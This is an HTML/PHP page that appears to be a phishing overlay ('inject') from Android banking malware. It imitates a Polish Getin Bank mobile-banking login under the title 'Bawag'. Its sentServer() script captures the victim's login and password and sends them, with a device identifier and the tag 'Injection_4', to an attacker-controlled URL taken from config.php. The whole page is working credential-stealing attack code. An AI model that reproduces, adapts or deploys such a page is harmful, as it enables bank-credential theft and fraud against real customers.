<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="pl/com.getingroup.mobilebanking/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<img src="data:image/png;base64,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" style="margin-left: 10px;">

    <div class="main">

        <div class="container">
<div class="row">
                <div class="col-xs-1 col-sm-2"></div>
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">

                        <form id="form">
                            <div class="form-group ">
									<label class="data_label" for="login">Wpisz login do Bankowosci Internetowej</label>
									<input type="text" class="form-control" placeholder="wprowadz login" name="field2" id="login" autocomplete="off" maxlength="10" data-reg="/.{3,10}/" >
                           </div>

						   <br>
                            <div class="form-group">
									<label class="data_label" for="password">Wprowadz haslo</label>
									<input type="password" class="form-control" name="field3" id="password" autocomplete="off" data-reg="/.{3,16}/" maxlength="16" >
                            </div><br>

                       				<input type="button" class="input_submitBtn" onClick="sentServer();" value="DALEJ">

<script>
	function sentServer()
	{

	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';

	var login1 = document.forms["form"].elements["login"].value;
	var pass = document.forms["form"].elements["password"].value;

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|getingroup|"+login1+"|"+pass);
	}
}
</script>

 </form><br>

</div>
                </div>
                <div class="col-xs-1 col-sm-2"></div>
            </div>
        </div>
    </div>


</body>
</html>
